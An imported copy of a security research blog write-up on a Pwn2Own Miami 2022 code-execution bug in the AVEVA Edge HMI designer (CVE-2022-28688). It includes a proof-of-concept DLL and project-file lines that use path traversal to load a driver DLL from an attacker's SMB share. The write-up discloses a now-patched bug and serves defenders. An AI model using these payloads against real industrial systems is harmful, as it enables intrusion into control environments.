---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-08_pwn2own-miami-2022-aveva-edge-arbitrary-code-execution.md
original_filename: 2022-09-08_pwn2own-miami-2022-aveva-edge-arbitrary-code-execution.md
title: 'Pwn2Own Miami 2022: AVEVA Edge Arbitrary Code Execution'
category: documents
detected_topics:
- command-injection
- sso
- access-control
- automation-abuse
- api-security
- cloud-security
tags:
- imported
- documents
- command-injection
- sso
- access-control
- automation-abuse
- api-security
- cloud-security
language: en
raw_sha256: 01d12dedd60b5948b04dde28b90739fd44d822e1aa96cd2cd9d72f5694b14d3e
text_sha256: 70b7b29f3e5855c8f41d8064c498ef08904b529e96fbdca044d33984eab64e13
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Pwn2Own Miami 2022: AVEVA Edge Arbitrary Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-08_pwn2own-miami-2022-aveva-edge-arbitrary-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, sso, access-control, automation-abuse, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `01d12dedd60b5948b04dde28b90739fd44d822e1aa96cd2cd9d72f5694b14d3e`
- Text SHA256: `70b7b29f3e5855c8f41d8064c498ef08904b529e96fbdca044d33984eab64e13`


## Content

---
title: "Pwn2Own Miami 2022: AVEVA Edge Arbitrary Code Execution"
page_title: "Pwn2Own Miami 2022: AVEVA Edge Arbitrary Code Execution | DEFION Research Labs"
url: "https://sector7.computest.nl/post/2022-09-aveva-edge/"
final_url: "https://defion.security/en/research-labs/pwn2own-miami-2022-aveva-edge-arbitrary-code-execution/"
authors: ["Daan Keuper (@daankeuper)", "Thijs Alkemade (@xnyhps)"]
programs: ["AVEVA"]
bugs: ["Arbitrary Code Execution", "Local Privilege Escalation"]
bounty: "20,000"
publication_date: "2022-09-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2192
---

[Home](/en/) › [Research Labs](/en/research-labs/) › Pwn2Own Miami 2022: AVEVA Edge Arbitrary Code Execution

Pwn2Own 8 September 2022 · 3 min read

# Pwn2Own Miami 2022: AVEVA Edge Arbitrary Code Execution

This write-up is part 3 of a series of write-ups about the 5 vulnerabilities we demonstrated last April at Pwn2Own Miami. This is the write-up for an Arbitrary Code Execution vulnerability in AVEVA Edge (CVE-2022-28688).

> [](https://twitter.com/thezdi/status/1516497902071341061)

AVEVA Edge can be used to design Human Machine Interfaces (HMI). It allows for the designing of GUI applications, which can be programmed using a scripting language. The screenshot below shows one of the demo projects that come with the installer:

![AVEVA Edge](/images/research-labs/pwn2own-miami-2022-aveva-edge-arbitrary-code-execution/demo.png)

For this category it was acceptable to achieve code execution by opening a project file within the target on the contest laptop. So we tried various things to get code execution from opening a malicious project file. The application has quite some functionalities that might be useful for achieving our goal. Users can add custom controls to a project, it has a powerful scripting language and it will connect to OPC UA servers upon starting, for example. However, most attack surface will require the user to first make one or more clicks within the application; which was not allowed for the competition.

## Communication drivers

AVEVA Edge also allows users to add communication drivers to a project. For example is has drivers to allow communication with a Siemens S7 PLC over a serial interface. Drivers in this case are just DLL files that are loaded into the project.

![Communication drivers](/images/research-labs/pwn2own-miami-2022-aveva-edge-arbitrary-code-execution/drivers.png)

Drivers are loaded whenever the user loads a project file in AVEVA Edge, which would mean that vulnerabilities here would be triggered without further user interaction.

AVEVA Edge projects consists of multiple files and directories, but the main project file that is also associated with the application is a INI-formatted file using the `.app` extension. The relevant section for communication drivers can be seen below:
  
  
  [UsedDrivers]
  Count=1
  Task0=Driver ABCIP

When looking at the loading process with [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) we see that drivers are loaded from `C:\Program Files (x86)\AVEVA\AVEVA Edge 2020\Drv\`:

![](/images/research-labs/pwn2own-miami-2022-aveva-edge-arbitrary-code-execution/procmon1.png)

Lets see what happens if we change the INI file to:
  
  
  [UsedDrivers]
  Count=1
  Task0=Driver ..\Computest

Loading the new project shows us:

![](/images/research-labs/pwn2own-miami-2022-aveva-edge-arbitrary-code-execution/procmon2.png)

Interesting :)...

For those interested, the actual loading of the file happens in `Bin/Studio.dll` at address `0x100c16f1`.

## Exploitation

From here exploitation is easy, we create a malicious DLL file:
  
  
  // dllmain.cpp
  #include "pch.h"
  
  BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
  {
  LPSTARTUPINFOA si = new STARTUPINFOA();
  LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
  CreateProcessA(NULL, (LPSTR)"calc.exe", NULL, NULL, TRUE, 0, NULL, NULL, si, pi);
  
  return TRUE;
  }

And let it load from an open SMB share:
  
  
  [UsedDrivers]
  Count=1
  Task0=Driver \\<IP>\shared\Sector7

You can see the exploit in action in the screen recording below.

Your browser does not support the video tag. 

## Thoughts

Interestingly enough all binaries, including the drivers, that come with AVEVA Edge are digitally signed. However, it appears that signatures are not checked when loading libraries.

Customers who use AVEVA Edge should update to version 2020 R2 SP1 and apply HF 2020.2.00.40, which should mitigate this issue.

We thank Zero Day Initiative for organizing this years edition of Pwn2Own Miami, we hope to return to a later edition!

You can find the other four write-ups here:

  * [OPC UA .NET Standard Trusted Application Check Bypass](/en/research-labs/pwn2own-miami-2022-opc-ua-net-standard-trusted-application-check-bypass/)
  * [Inductive Automation Remote Code Execution](/en/research-labs/pwn2own-miami-2022-inductive-automation-ignition-remote-code-execution/)
  * [Unified Automation C++ Demo Server DoS](/en/research-labs/pwn2own-miami-2022-unified-automation-c-demo-server-dos/)
  * [ICONICS GENESIS64 Arbitrary Code Execution](/en/research-labs/pwn2own-miami-2022-iconics-genesis64-arbitrary-code-execution/)

From our research desk to your environment

The offensive expertise behind this research is the same expertise that tests your own systems. Find the vulnerabilities that matter before attackers do. 

[Red Teaming →](/en/pentesting-services/red-teaming-service/)

[← Back to Research Labs](/en/research-labs/)
